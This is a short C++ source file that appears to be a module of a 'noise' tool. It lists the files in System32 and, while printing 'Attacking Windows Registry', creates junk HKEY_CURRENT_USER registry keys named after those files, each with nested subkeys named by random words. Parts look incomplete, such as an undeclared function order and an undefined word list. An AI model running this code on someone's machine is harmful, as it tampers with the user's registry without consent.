
#include <Windows.h>
#include <stdio.h>
#include <string>
#include <modules/registry.hpp>
#include <dnsnoise.h>

int find_dir()
{
    WIN32_FIND_DATAA data;
    LARGE_INTEGER filesize;
    printf("Attacking Windows Registry\n");
    HANDLE hFind = FindFirstFileA("C:\\Windows\\System32\\*", &data); // FILES
    if (INVALID_HANDLE_VALUE == hFind)
    {
        return 1;
    }
    do
    {
        if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
            //printf("  %s   <DIR>\n", data.cFileName);
        }
        else
        {
            filesize.LowPart = data.nFileSizeLow;
            filesize.HighPart = data.nFileSizeHigh;
            //printf("  %s   %ld bytes\n", data.cFileName, filesize.QuadPart);
            std::string filename(data.cFileName);
            size_t lastindex = filename.find_last_of("."); 
            std::string rawname = filename.substr(0, lastindex); 
            //printf("%s \n", rawname.c_str());
            find_reg(rawname);
        }
    } while (FindNextFileA(hFind, &data) != 0);

    return 0;
}

bool find_reg (std::string key) {
    HKEY hkey;
    DWORD cbData;
    //RegOpenKeyExA(HKEY_CURRENT_USER, key.c_str(), 0, KEY_ALL_ACCESS, &hkey);
    RegCreateKeyExA(HKEY_CURRENT_USER, key.c_str(), 0, 0, 0, KEY_ALL_ACCESS, 0, &hkey, 0);
    int wordlist_size = WORDLIST.size();
    std::string word1 = WORDLIST.at(rand() % wordlist_size);
    std::string word2 = WORDLIST.at(rand() % wordlist_size);
    RegCreateKeyExA(hkey, word1.c_str(), 0, 0, 0, KEY_ALL_ACCESS, 0, &hkey, 0);
    RegCreateKeyExA(hkey, word2.c_str(), 0, 0, 0, KEY_ALL_ACCESS, 0, &hkey, 0);
    return 0;
}